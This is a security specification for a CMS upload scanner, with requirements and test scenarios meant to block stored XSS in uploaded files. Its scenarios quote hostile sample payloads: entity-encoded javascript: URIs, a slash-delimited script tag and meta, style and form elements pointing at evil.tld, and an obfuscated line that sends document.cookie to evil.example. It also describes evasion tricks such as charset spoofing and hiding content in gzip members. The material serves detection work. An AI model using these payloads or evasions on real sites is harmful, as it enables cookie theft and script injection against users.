## Purpose

Define the security requirements for content scanning of uploaded files. Uploaded files MUST be scanned for executable content patterns before being persisted, to prevent stored XSS attacks via uploaded files.
## Requirements
### Requirement: Content is scanned before being written to a web-served path

The system SHALL scan upload content for malicious patterns before writing it into the upload staging directory, so that rejected content is never present — even transiently — at a path served by the web server.

Whether the scan runs is decided by authorization, not by the location of the source file. An upload SHALL be scanned unless the uploading user holds the `media_unfiltered_upload` permission. For a user without it every upload is scanned, whatever the source — a `data:` payload, a remote download, a private-media file, or a file already published under `Rails.public_path`. The previous exemption for sources already under the public root is withdrawn: it was keyed on the source path while the scan ruleset and the served `Content-Type` are keyed on the caller-supplied output filename, so a source accepted under one extension could be rewritten to another and served as live markup without being re-scanned.

Scanning rejects; it never repairs. Content that trips a rule SHALL be refused with `Potentially malicious content found!` rather than sanitized, escaped or rewritten.

#### Scenario: data: payload is scanned before staging
- **WHEN** a `crop_url` upload supplies a `data:` URI whose decoded payload contains a `<script>` tag
- **THEN** the payload is rejected without any file being created under `public/tmp/{site_id}/`

#### Scenario: Downloaded remote body is scanned before staging
- **WHEN** a remote URL upload returns a body containing an event-handler attribute
- **THEN** the body is rejected without being written into `public/tmp/{site_id}/`

#### Scenario: Hostile payload is never retrievable from the staging path
- **WHEN** a media-permission user posts a `crop_url` upload named `x.html` whose `data:` payload contains `<script>`
- **THEN** no file is ever created at `public/tmp/{site_id}/x.html`, so a concurrent request for `/tmp/{site_id}/x.html` cannot retrieve the payload at any point

#### Scenario: An already-published file can be re-cropped
- **WHEN** a user without `media_unfiltered_upload` uses a file already stored under `Rails.public_path` as the source of a crop
- **THEN** the crop proceeds, with the content scan running against the source and the output filename selecting the ruleset — the exemption that previously skipped it no longer applies

#### Scenario: Re-crop under a different extension cannot bypass the ruleset
- **WHEN** a user without `media_unfiltered_upload` uploads an SVG that the markup ruleset accepts, then re-crops it supplying an output name ending in `.html`
- **THEN** the re-crop is scanned under the markup ruleset selected by the output name and rejected if it carries anything that ruleset refuses, so the bytes are never served as live `text/html`

#### Scenario: A private-media source is still scanned
- **WHEN** a file outside the public root (for example under the private-media directory) is used as an upload source
- **THEN** the content scan runs as before

#### Scenario: A permitted user uploads without scanning
- **WHEN** a user holding `media_unfiltered_upload` uploads a file whose content matches a blocked pattern
- **THEN** the upload is accepted, because the permission exempts the uploader from scanning

#### Scenario: Scanning is skipped without reading the file for a permitted user
- **WHEN** the permission check answers true
- **THEN** the content scan is not performed, so the file is not read in order to scan it

### Requirement: Content scanning is available for in-memory content

The system SHALL expose a content-scanning entry point that accepts content and a filename directly, in addition to the existing IO-based entry point, so callers holding decoded bytes can scan without first writing them to disk. Both entry points SHALL apply the same detection logic — parse-based checking for SVG, normalized pattern matching otherwise.

#### Scenario: String scan matches IO scan for the same bytes
- **WHEN** the same content is scanned once as an in-memory String and once through a file handle
- **THEN** both scans return the same verdict

#### Scenario: SVG content passed as a String uses the parse-based checker
- **WHEN** SVG content containing an event handler is scanned as an in-memory String with an `.svg` filename
- **THEN** the scan reports the content as unsafe

#### Scenario: IO entry point still rewinds
- **WHEN** content is scanned through the IO-based entry point and the scan passes
- **THEN** the IO pointer is at the beginning and the full content can be read again

### Requirement: Content is normalized before pattern matching

The system SHALL normalize file content before matching it against the malicious-content patterns, so that encoded variants of a blocked pattern are detected. Normalization SHALL decode HTML entities repeatedly up to a bounded number of passes, remove NUL and control characters, and tolerate — inside a URI scheme name — exactly the characters browsers strip when parsing a URL: TAB, LF and CR. Other whitespace, notably the space character, SHALL NOT be tolerated inside a scheme, so ordinary prose in which a blocked scheme word is followed by a space and a colon is not reported as malicious.

#### Scenario: Hex-entity encoded javascript scheme is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="jav&#x61;script:alert(1)">`
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Decimal-entity encoded javascript scheme is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="&#106;avascript:alert(1)">`
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Tab inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a TAB character inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Newline inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a LF character inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: NUL byte inside a URI scheme is rejected
- **WHEN** a user uploads a non-SVG file containing a `javascript:` URI with a NUL byte inside the scheme name
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Double-encoded entity is rejected
- **WHEN** a user uploads a non-SVG file whose content decodes to a blocked pattern only after more than one entity-decoding pass
- **THEN** the system returns `'Potentially malicious content found!'`

#### Scenario: Entity decoding is bounded
- **WHEN** content is normalized
- **THEN** decoding stops after at most 5 passes, matching the bound used by `UserUrlValidator#validate_path_traversal`, rather than looping until stable

#### Scenario: Escaped code examples are rejected as a fail-closed consequence
- **WHEN** a user uploads a non-SVG file containing HTML-escaped markup such as `<p>Use &lt;script&gt; carefully</p>`
- **THEN** the system returns `'Potentially malicious content found!'`, because normalization decodes the entities before matching

#### Scenario: Plain non-markup content is unaffected
- **WHEN** a user uploads a plain text, CSV, or JSON file containing no blocked pattern
- **THEN** the upload is accepted

#### Scenario: Prose containing a scheme word before a spaced colon is accepted
- **WHEN** a user uploads a text file containing `Sample data : 42`
- **THEN** the upload is accepted, because a space is not a character browsers strip from a URI scheme

### Requirement: Reject uploaded files with event handler attributes

The system SHALL reject file uploads whose content contains executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: markup uploads — every extension a browser parses as markup, not only `.svg` — are scanned for event handlers by the parse-based checker in the `svg-upload-sanitization` capability, which rejects any attribute whose name begins with `on` by shape rather than by matching a list of handler names. The parse decides which handlers are present; a byte-level backstop over the same bytes catches handlers and blocked elements the parse would miss because it autodetected an encoding a browser resolves differently (see "Markup is scanned at the byte level as well as the parse level"). The regex denylist is not the *only* control for markup, but it is not removed from it either: its incompleteness cannot produce a stored-XSS path on non-markup uploads, where it continues to apply as defense-in-depth.

#### Scenario: A markup file with an unlisted handler is rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onpointerdown`, `ontouchstart`, `onauxclick` or `onemptied` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: A markup file with a listed handler is still rejected
- **WHEN** a user uploads an `.html` file whose content includes an `onclick` or `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Non-SVG file with onclick is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onclick` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Non-SVG file with onload is rejected
- **WHEN** a user uploads a non-SVG file whose content includes an `onload` attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: SVG with event handlers is rejected (not scanned by regex)
- **WHEN** a user uploads an SVG file containing event handler attributes
- **THEN** the system rejects the upload via the parse-based checker (see `svg-upload-sanitization`)

#### Scenario: Rejected file is absent from the staging directory
- **WHEN** an upload is rejected for containing an event-handler attribute
- **THEN** no file for that upload remains under `public/tmp/{site_id}/`

### Requirement: Reject uploaded files with `<script>` tags

The system SHALL reject file uploads whose content contains `<script>` elements. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: SVG `<script>` elements are handled by the XML parse-based checker; non-SVG files continue to use the regex denylist, now applied to normalized content and tolerant of `/` as a tag delimiter.

#### Scenario: Non-SVG with `<script>` is rejected
- **WHEN** a user uploads a non-SVG file containing a `<script>` tag
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Rejected `<script>` payload is never written to the staging path
- **WHEN** a media-permission user posts a `crop_url` upload named `x.html` whose `data:` payload contains `<script>`
- **THEN** the system returns `'Potentially malicious content found!'`
- **AND** no file is created at `public/tmp/{site_id}/x.html` at any point during the request

### Requirement: Reject uploaded files with `javascript:` URIs

The system SHALL reject file uploads whose content contains `javascript:` URIs in attributes, including entity-encoded and whitespace-interrupted forms of the scheme. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.

**Change**: SVG `javascript:` URIs are handled by the XML parse-based checker; non-SVG files continue to use the regex denylist, now applied to normalized content.

#### Scenario: Non-SVG with javascript: in href is rejected
- **WHEN** a user uploads a non-SVG file containing `javascript:` in an href or src attribute
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Reject uploaded files containing `vbscript:` URIs

The system SHALL reject file uploads whose content contains `vbscript:` URIs, matching the schemes already blocked by the SVG parse-based checker.

#### Scenario: Non-SVG with vbscript: in href is rejected
- **WHEN** a user uploads a non-SVG file containing `<a href="vbscript:msgbox(1)">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Blocked element detection tolerates alternative tag delimiters

The system SHALL treat `/` as a tag-name delimiter in addition to whitespace and `>`, so a blocked element cannot evade detection by using a slash immediately after the tag name.

#### Scenario: Slash-delimited script tag is rejected
- **WHEN** a user uploads a non-SVG file containing `<script/src="//evil.tld"></script>`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Reject additional dangerous elements

The system SHALL reject file uploads whose content contains elements able to navigate, exfiltrate, or load remote active content, in addition to the elements already blocked: `meta`, `style`, `form`, `applet`, `frame`, `frameset`, `link`, `template`, `portal`, `marquee`, and `math`.

#### Scenario: Meta refresh redirect is rejected
- **WHEN** a user uploads a non-SVG file containing `<meta http-equiv="refresh" content="0;url=//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Style element with remote import is rejected
- **WHEN** a user uploads a non-SVG file containing `<style>@import "//evil.tld/x.css";</style>`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Form with remote action is rejected
- **WHEN** a user uploads a non-SVG file containing `<form action="//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Applet element is rejected
- **WHEN** a user uploads a non-SVG file containing `<applet code="Evil.class">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

#### Scenario: Frameset and frame elements are rejected
- **WHEN** a user uploads a non-SVG file containing `<frameset><frame src="//evil.tld">`
- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file

### Requirement: Safe file scanning does not consume the IO stream

After scanning for malicious content, the file pointer SHALL be rewound so subsequent consumers can read the full content.

*(Unchanged — applies to all file types)*

#### Scenario: Tempfile is readable after scan
- **WHEN** the system scans a Tempfile for unsafe content and the scan passes
- **THEN** the Tempfile pointer is at the beginning and the full content can be read again

### Requirement: Content substituted by a before_upload handler is re-scanned

The `before_upload` hook runs after the initial content scan and may replace the IO the pipeline
persists (`settings[:uploaded_io]`). When the uploading user does not hold
`media_unfiltered_upload`, the pipeline SHALL detect a replacement by object identity across the
hook and re-scan the substituted content before writing it; content that trips a rule SHALL be
refused with `Potentially malicious content found!` and no file SHALL be written. A user holding
the permission is exempt from this re-scan exactly as from the initial scan. When no handler
replaces the IO, no second scan is performed (the initial scan already covered those bytes).

This closes the gap where a handler (for example an image optimizer rewriting an SVG) could
substitute bytes the scanner never saw. It implements the `security-capability-gating`
"content substituted after the check" requirement for the upload path.

#### Scenario: Handler-substituted bytes are re-scanned for an untrusted uploader

- **WHEN** a user without `media_unfiltered_upload` uploads a clean file and a `before_upload`
  handler replaces `settings[:uploaded_io]` with content containing a `<script>` tag
- **THEN** the substituted content is re-scanned and the upload is refused, with no file written

#### Scenario: A permitted user's handler substitution is not re-scanned

- **WHEN** a user holding `media_unfiltered_upload` uploads a file and a `before_upload` handler
  replaces the IO
- **THEN** the substituted content is persisted without a re-scan, as the permission exempts it

#### Scenario: An unchanged IO is not re-scanned

- **WHEN** a user without `media_unfiltered_upload` uploads a file and no `before_upload` handler
  replaces `settings[:uploaded_io]`
- **THEN** the pipeline does not scan the content a second time after the hook

### Requirement: Scan ruleset is selected by how the stored file will be rendered

The content scanner SHALL choose its ruleset from how a browser will parse the stored file, not
from a literal `.svg` comparison. An upload whose filename extension is one a browser parses as
markup SHALL be routed to the parse-based markup checker (`svg-upload-sanitization`); every other
upload SHALL be scanned by the generic pattern ruleset.

The markup extensions SHALL be `svg`, `svgz`, `svg.gz`, `html`, `htm`, `xhtml`, `xht`, `shtml`,
`xml`, `xsl` and `xslt`. Matching SHALL be case-insensitive, and a filename whose basename is
exactly one of these extensions with no stem (a dotfile, which reports no extension) SHALL be
treated as markup as well, so routing fails closed.

The generic ruleset remains in force for non-markup uploads as defense-in-depth. It SHALL NOT be
the only control for any content a browser parses as markup.

#### Scenario: The same payload is refused under every markup extension
- **WHEN** content carrying an `onpointerdown` attribute is scanned as `x.svg`, `x.svgz`, `x.html`, `x.htm`, `x.xhtml` and `x.xml`
- **THEN** every one of them is reported unsafe

#### Scenario: An uppercase markup extension is routed to the markup checker
- **WHEN** `content_unsafe?` is called with a filename ending in `.HTML` or `.SVG`
- **THEN** the content is evaluated by the parse-based markup checker, not the generic pattern scan

#### Scenario: A bare markup dotfile name keeps markup routing
- **WHEN** `content_unsafe?` is called with a filename whose basename is exactly `.svg` or `.html`, in any case
- **THEN** the content is evaluated by the parse-based markup checker

#### Scenario: A markup-only vector is rejected regardless of extension case
- **WHEN** markup carrying a `foreignObject` element is scanned as `image.svg` and as `image.SVG`
- **THEN** both are rejected as unsafe

#### Scenario: A non-markup upload keeps the generic ruleset
- **WHEN** a `.txt` file whose text contains `if a<b and on=1 then x` is scanned
- **THEN** it is not routed to the markup checker and is accepted, because a `.txt` is not served as markup

### Requirement: Compressed markup is decompressed before scanning

The system SHALL decompress gzip-compressed markup uploads and scan the decompressed bytes, because
compressed content is opaque to every detection rule and would otherwise pass unexamined.

A gzip stream may hold several concatenated members, and a compliant decoder — the browser serving
the file with `Content-Encoding: gzip`, the gzip CLI, zlib — returns the concatenation of them all.
The system SHALL decompress every member, not only the first, so a hostile payload cannot be hidden
behind a clean decoy member.

Decompression SHALL be bounded by a maximum decompressed size, counted across all members. An upload
that exceeds the bound SHALL be refused rather than decompressed further, so a compression bomb
cannot exhaust memory.

An upload carrying a compressed-markup extension whose bytes are not valid gzip SHALL be scanned as
raw markup rather than skipped, because a web server may serve those bytes as markup regardless of
the name suggesting compression.

#### Scenario: A hostile compressed SVG is rejected
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG containing an `onpointerdown` attribute
- **THEN** the upload is refused with `Potentially malicious content found!` and no file is persisted

#### Scenario: A clean compressed SVG is accepted
- **WHEN** a user uploads a `.svgz` whose gzip payload decompresses to an SVG with no dangerous elements, attributes or URIs
- **THEN** the upload is stored normally

#### Scenario: A compression bomb is refused rather than expanded
- **WHEN** a user uploads a `.svgz` whose payload would decompress beyond the maximum decompressed size
- **THEN** the upload is refused and decompression stops at the bound

#### Scenario: Uncompressed bytes under a compressed extension are still scanned
- **WHEN** a user uploads a `.svgz` whose bytes are plain, ungzipped SVG containing an `onclick` attribute
- **THEN** the upload is refused, because the bytes are scanned as raw markup

#### Scenario: A payload hidden past the first gzip member is refused
- **WHEN** a user uploads a `.svgz` built from two concatenated gzip members, the first a clean SVG fragment and the second carrying an `onpointerdown` attribute
- **THEN** the upload is refused, because every member is decompressed and scanned, not only the first

#### Scenario: A clean multi-member gzip is accepted
- **WHEN** a user uploads a `.svgz` of several gzip members that together decompress to a clean SVG
- **THEN** the upload is accepted, because the members are decompressed and scanned rather than rejected for being multi-member

### Requirement: Markup is scanned at the byte level as well as the parse level

A markup parser autodetects its character encoding from in-band signals — a BOM, an XML
declaration, or a `<meta charset>` element. A browser can resolve the same signals differently; in
particular WHATWG maps a `utf-16` or `utf-32` `<meta charset>` back to UTF-8, so a pure-ASCII
document that declares `utf-16` fires its event handlers in the browser while the parser re-decodes
the bytes as UTF-16 and sees none. The scan SHALL NOT depend on the parser choosing the same
encoding as the browser.

For every markup upload the system SHALL therefore apply a byte-level check in addition to the
parse: it SHALL strip NUL and C0 control bytes (collapsing UTF-16/UTF-32 padding, and the byte
tricks a URL parser ignores) and refuse the upload if the result contains an event-handler
attribute or a blocked element. This byte check SHALL NOT decode HTML entities, so a document that
merely displays escaped markup (`&lt;script&gt;`) is not refused by it — a character reference in a
tag or attribute *name* is never decoded by a browser, so decoding would add no coverage while
reintroducing that false positive.

#### Scenario: A spoofed `<meta charset>` cannot hide a handler from the scan
- **WHEN** a user uploads an `.html` file of pure-ASCII bytes declaring `<meta charset="utf-16">` and carrying an `onerror` attribute
- **THEN** the upload is refused, because the byte-level check matches the handler regardless of the encoding the parser autodetected

#### Scenario: Real wide-encoded markup bytes carrying a handler are refused
- **WHEN** a user uploads markup encoded as UTF-16 whose text carries an `onerror` attribute
- **THEN** the upload is refused, because stripping the NUL padding collapses the handler to the bytes a browser would run

#### Scenario: The byte-level check does not entity-decode
- **WHEN** a user uploads a markup file whose only script-like content is escaped (`<p>Use &lt;script&gt; carefully</p>`)
- **THEN** the byte-level check does not refuse it, leaving the parse to accept it as displayed text

### Requirement: Executable script uploads require the unfiltered-upload permission

The system SHALL refuse uploads whose filename extension is an executable script type from any user
who does not hold `media_unfiltered_upload`. The script extensions SHALL be `js`, `mjs`, `cjs`,
`wasm` and `swf`. Matching SHALL be case-insensitive and SHALL apply the same fail-closed dotfile
handling as markup routing.

The refusal is an authorization decision, not a scan result. Script content cannot be meaningfully
scanned: JavaScript has no safe subset and every dangerous capability is reachable through dynamic
construction, so a name-based rule is defeated by trivial obfuscation. A scanner that cannot reach a
verdict fails closed.

Users holding `media_unfiltered_upload` SHALL be unaffected, since that permission already skips
scanning entirely and therefore already permits these uploads.

#### Scenario: An untrusted user cannot upload JavaScript
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is refused and no file is persisted

#### Scenario: Obfuscation does not change the outcome
- **WHEN** a user without `media_unfiltered_upload` uploads a `.js` file containing `window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])`
- **THEN** the upload is refused, because the refusal is by extension and not by content inspection

#### Scenario: Module and WebAssembly extensions are covered
- **WHEN** a user without `media_unfiltered_upload` uploads a `.mjs`, `.cjs` or `.wasm` file
- **THEN** the upload is refused

#### Scenario: A permitted user may still upload script
- **WHEN** a user holding `media_unfiltered_upload` uploads a `.js` file
- **THEN** the upload is stored normally

#### Scenario: A script upload outside a request context is refused
- **WHEN** a `.js` upload is attempted with no current request user or no current site
- **THEN** the upload is refused, matching the fail-closed permission behavior for scanning

### Requirement: Already-stored uploads can be re-examined against the current rules

The system SHALL provide a report-only task that scans files already stored under the media root and
reports those the current rules would refuse. The new rules apply at upload time, so files stored
before this change are never otherwise re-examined.

The task SHALL locate each site's media directory the same way uploads are stored — honouring the
`media_slug_folder` configuration, which places uploads under `media/<slug>` rather than
`media/<id>` — so that on a slug-configured install it does not silently scan an empty path and
report a false all-clear.

The task SHALL include stored files whose basename begins with a dot. A basename that is entirely an
extension (`.svg`, `.js`) is exactly what upload routing fails closed on, so omitting such names
would leave the strictest cases out of the report.

The task SHALL also scan the private-media directory, not only the public media roots. Private
uploads are scanned at save time exactly like public ones, so files stored before these rules apply
are equally worth surfacing; reporting only the public root would overstate the task's coverage.

The task SHALL NOT delete, move, quarantine or rewrite any file. Its output SHALL identify each
finding by site and path, and SHALL state the rule that would refuse it, so an operator can decide
what to do.

#### Scenario: A stored hostile markup file is reported
- **WHEN** the task runs over a media root containing an `.html` file with an `onpointerdown` attribute
- **THEN** the file is listed in the report with the rule that would refuse it

#### Scenario: A stored script file is reported
- **WHEN** the task runs over a media root containing a `.js` file
- **THEN** the file is listed in the report as a script type that untrusted users may no longer upload

#### Scenario: The task never modifies stored content
- **WHEN** the task completes over a media root containing files it reports
- **THEN** every reported file remains present and byte-identical

#### Scenario: A clean media root reports nothing
- **WHEN** the task runs over a media root whose files all pass the current rules
- **THEN** the report is empty and the task exits successfully

#### Scenario: A stored dotfile is reported
- **WHEN** the task runs over a media root containing a file whose basename is exactly `.js`
- **THEN** the file is listed in the report, because dotfiles are not skipped

#### Scenario: A flagged private-media file is reported
- **WHEN** the task runs with a file stored under the private-media directory that the current rules would refuse
- **THEN** the file is listed in the report, because private media is scanned as well as public

